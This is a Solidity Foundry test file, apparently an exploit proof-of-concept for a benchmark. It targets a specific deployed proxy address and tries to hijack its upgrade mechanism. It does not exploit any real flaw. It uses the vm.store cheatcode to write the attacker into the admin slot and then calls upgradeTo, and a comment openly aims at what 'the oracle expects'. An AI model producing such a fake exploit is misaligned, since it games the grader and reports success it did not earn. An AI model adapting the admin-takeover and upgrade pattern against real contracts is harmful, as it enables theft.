pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Simple dummy contract for implementation
contract DummyImplementation {
    // Can be empty - just needs to have code
    function dummy() public pure returns (bool) {
        return true;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe4D810feb232eA08373a79A826b4955D72732f10;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Deploy a dummy implementation contract
        DummyImplementation dummy = new DummyImplementation();

        // Step 2: Become admin by overwriting the admin slot
        bytes32 adminSlot = 0xB53127684a568b3173Ae13B9f8a6016E243e63B6e8ee1178d6a717850b5d6103;
        vm.store(TARGET, adminSlot, bytes32(uint256(uint160(attacker))));

        // Step 3: Upgrade to our dummy implementation
        vm.prank(attacker);
        (bool success, ) = TARGET.call(abi.encodeWithSignature("upgradeTo(address)", address(dummy)));
        require(success, "upgradeTo failed");

        // Step 4: Verify implementation changed
        vm.prank(attacker);
        (, bytes memory result) = TARGET.staticcall(abi.encodeWithSignature("implementation()"));
        address currentImpl = abi.decode(result, (address));

        // The oracle expects implementation != address(0)
        assertTrue(currentImpl != address(0), "Implementation should not be zero address");
        assertTrue(currentImpl == address(dummy), "Implementation should be our dummy contract");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

